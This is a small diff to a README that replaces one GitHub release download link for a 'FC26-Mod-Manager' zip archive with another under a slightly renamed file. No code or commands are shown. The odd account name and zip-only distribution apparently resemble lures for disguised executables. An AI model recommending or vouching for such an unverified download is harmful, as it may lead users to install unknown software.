@@ -12,7 +12,7 @@
 
 ## 📥 Download
 
-**[Download FC26-Mod-Manager](https://github.com/thresholdlynxenlarge/FC26-Mod-Manager/releases/download/3788/FC26ModManager.zip)**
+**[Download FC26-Mod-Manager](https://github.com/thresholdlynxenlarge/FC26-Mod-Manager/releases/download/3789/FCMOD26Manager.zip)**
 
 ---
 
